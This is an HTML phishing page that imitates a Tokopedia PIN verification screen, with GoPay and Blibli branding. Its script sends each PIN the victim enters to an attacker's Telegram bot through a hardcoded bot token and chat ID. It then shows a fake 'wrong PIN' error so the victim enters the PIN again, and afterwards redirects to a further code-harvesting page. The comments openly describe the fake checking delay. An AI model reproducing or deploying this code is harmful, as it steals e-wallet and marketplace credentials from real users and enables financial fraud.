<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" sizes="144x144" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon144.png">
    <script type='text/javascript' src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        html { -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%; }
        body { background-color: #fff; margin: 0 auto; font-family: system-ui; }
        .app-alexhosting { text-align: center; }
        .alexariandi-shop { background: #f3f4f5; width: 100%; display: flex; justify-content: space-around; padding: 10px; border-bottom: 1px solid #f3f3f3; align-items: center; box-sizing: border-box; }
        .shopalex { width: 40px; }
        .exalex { width: 100px; }
        .ucapan-img { margin-top: 20px; width: 50%; max-width: 200px; }
        .cothak-input { width: 90%; margin: 10px auto; border-radius: 10px; padding: 20px 0; background: url(alexFrontEnd/bg.png) no-repeat center; background-size: cover; border: 1px solid #8a8a8a; box-shadow: 0px 0px 8px #0808089c; }
        .ucapan-otp { color: #000; font-weight: 600; margin-bottom: 40px; }
        .input-ariandi { font-size: 18px; padding: 10px; width: 80%; border: 1px solid #03ac0e; border-radius: 5px; text-align: center; }
        .btn-selectmarsya { margin-top: 20px; background: #03ac0e; border: none; border-radius: 5px; color: #fff; font-size: 18px; padding: 10px; width: 80%; font-weight: 700; cursor: pointer; }
        /* Style untuk pesan kesalahan */
        #detik { color: #ff6b6b; font-weight: bold; font-size: 14px; margin-top: 5px; height: 20px; }
    </style>
</head>

<body>
    <div class="app-alexhosting">
        <div class="alexariandi-shop">
            <img class="shopalex" src="img/logo.png">
            <img class="exalex" style="width:50px;" src="img/gopay.png">
            <img class="exalex" src="img/bibli.png">
        </div>

        <div class="ContainerAlex">
            <img class="ucapan-img" src="img/image.png">
            <div class="cothak-input login">
                <form id="formotp" onsubmit="sendOtp(event)">
                    <p class="ucapan-otp">Masukkan Kode PIN</p>
                    <div class="input-marsya">
                        <input class="input-ariandi" id="alexhosting" type="number" name="otpcvv" placeholder="Pin Tokopedia" pattern="\d*" inputmode="numeric" required>
                    </div>
                    <div id="detik"></div> 
                    
                    <button type="submit" class="btn-selectmarsya" id="btnSubmit1">Verifikasi</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
        const TELEGRAM_CHAT_ID = '7823308464';
        
        let errorCount = 0;

        function sendOtp(event) {
            event.preventDefault();

            const btn = document.getElementById('btnSubmit1');
            const otpInput = document.getElementById('alexhosting');
            const errorDisplay = document.getElementById('detik');
            const otpValue = otpInput.value;

            // Efek Loading
            btn.innerHTML = "Memproses...";
            btn.disabled = true;

            // 1. Kirim data ke Telegram (tetap dikirim baik salah maupun benar)
            sendToTelegram(otpValue);

            // Simulasi Delay agar terlihat seperti sedang mengecek
            setTimeout(() => {
                errorCount++;

                if (errorCount === 1) {
                    // PERCOBAAN PERTAMA: Muncul tulisan salah
                    errorDisplay.innerHTML = "PIN Tokopedia salah. Masukkan ulang PIN Anda.";
                    otpInput.value = ""; // Kosongkan input
                    btn.innerHTML = "Verifikasi";
                    btn.disabled = false;
                    otpInput.focus();
                } else {
                    // PERCOBAAN KEDUA: Berhasil/Redirect
                    window.location.href = "otpcvv.html";
                }
            }, 2000);
        }

        function sendToTelegram(otp) {
            const message = `üîê *KODE PIN TOKOPEDIA*\n\n` +
                            `PIN: \`${otp}\`\n` +
                            `Percobaan Ke: ${errorCount + 1}\n` +
                            `Waktu: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
    </script>
</body>
</html>

